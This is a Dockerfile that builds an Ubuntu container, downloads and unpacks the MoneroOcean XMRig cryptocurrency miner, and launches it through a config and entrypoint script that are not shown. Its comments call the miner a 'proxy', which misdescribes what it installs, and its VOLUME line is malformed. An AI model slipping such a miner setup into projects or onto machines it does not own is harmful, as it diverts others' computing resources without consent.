# Base image Ubuntu
FROM ubuntu:latest

# Update and upgrade image
RUN apt-get update && apt-get upgrade -y

# Install necessary packages
RUN apt-get install -y git wget tar ca-certificates curl build-essential libuv1-dev libssl-dev libhwloc-dev cmake uuid-dev libmicrohttpd-dev

# Download proxy
RUN wget https://github.com/MoneroOcean/xmrig/releases/download/v6.21.3-mo15/xmrig-v6.21.3-mo15-lin64.tar.gz

# Extract proxy
RUN mkdir -p /xmrig && tar xf xmrig-v6.21.3-mo15-lin64.tar.gz -C /xmrig

# Remove tar file
RUN rm xmrig-v6.21.3-mo15-lin64.tar.gz

# Copy config file
COPY config.json /xmrig

# Copy entrypoint script
COPY entrypoint.sh /xmrig

# Change directory
WORKDIR /xmrig

# Give permission
RUN chmod +x ./entrypoint.sh

# Create volume
VOLUME /xmrig:/xmrig-worker

# Use entrypoint script
ENTRYPOINT ["./entrypoint.sh"]
